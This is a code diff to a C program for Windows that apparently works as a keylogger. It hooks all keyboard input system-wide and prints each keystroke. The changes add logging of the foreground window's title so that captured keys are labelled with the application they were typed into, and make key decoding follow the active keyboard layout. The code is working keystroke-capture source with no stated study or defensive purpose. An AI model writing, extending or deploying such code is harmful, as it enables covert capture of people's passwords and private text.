@@ -5,8 +5,10 @@
  * Entry point for the project.
  */
 
+#include <locale.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <wchar.h>
 
 #include <windows.h>
 
@@ -37,14 +39,37 @@ LRESULT CALLBACK hook_procedure(int code, WPARAM wparam, LPARAM lparam) {
             keyboard[VK_CAPITAL] = 0;
         }
 
+        HWND window = GetForegroundWindow();
+        DWORD thread;
+        HKL layout = NULL;
+
+        if (window) {
+            thread = GetWindowThreadProcessId(window, NULL);
+            layout = GetKeyboardLayout(thread);
+
+            WCHAR title[256];
+            GetWindowTextW(
+                window,
+                (LPWSTR) title,
+                sizeof(title) / sizeof(*title));
+
+            static WCHAR prev_title[256] = { 0 };
+
+            if (wcscmp(title, prev_title)) {
+                wcscpy(prev_title, title);
+                printf("\n\n{%ls}\n", title);
+            }
+        }
+
         WCHAR buffer[4] = { 0 };
-        int const count = ToUnicode(
+        int const count = ToUnicodeEx(
             input->vkCode,
             input->scanCode,
             keyboard,
             buffer,
             sizeof(buffer) / sizeof(*buffer),
-            0);
+            0,
+            layout);
 
         if (count && buffer[0] >= 32 && buffer[0] != 127) {
             BOOL const ctrl = (GetAsyncKeyState(VK_CONTROL) & 32768);
@@ -94,15 +119,18 @@ LRESULT CALLBACK hook_procedure(int code, WPARAM wparam, LPARAM lparam) {
  * \return Exit code.
  */
 int main() {
+    setlocale(LC_ALL, ".UTF8");
+    SetConsoleOutputCP(CP_UTF8);
+
     HINSTANCE instance = GetModuleHandle(NULL);
     if (!instance) {
-        fprintf(stderr, "[ERROR] Failed to get instance: GetModuleHandle.");
+        fprintf(stderr, "[ERROR] Failed to get instance: GetModuleHandle.\n");
         return EXIT_FAILURE;
     }
 
     HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_procedure, instance, 0);
     if (!hook) {
-        fprintf(stderr, "[ERROR] Failed to set hook: SetWindowsHookEx.");
+        fprintf(stderr, "[ERROR] Failed to set hook: SetWindowsHookEx.\n");
         return EXIT_FAILURE;
     }
 
